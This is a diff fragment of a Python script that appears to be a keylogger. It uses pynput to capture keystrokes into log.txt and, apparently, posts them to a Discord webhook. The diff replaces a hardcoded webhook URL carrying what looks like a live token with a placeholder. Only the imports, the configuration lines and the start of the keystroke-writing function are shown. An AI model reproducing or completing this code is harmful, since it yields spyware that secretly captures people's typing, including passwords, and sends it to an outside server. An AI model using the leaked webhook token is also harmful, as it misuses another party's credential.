@@ -4,7 +4,7 @@ import requests
 from pynput.keyboard import Key, Listener
 
 LOG_FILE = 'log.txt'
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1135709457398108313/A3xSHQnpsf2Cgx3p3Rag36Mn7eI4D8r1LlJknTLK4MifSyHOYUga3e6Y2G7Y_vdfEk8b'
+WEBHOOK_URL = 'YOUR_WEBHOOKS_API_HERE'
 
 def write_file(key):
     k = str(key).replace("'", "")
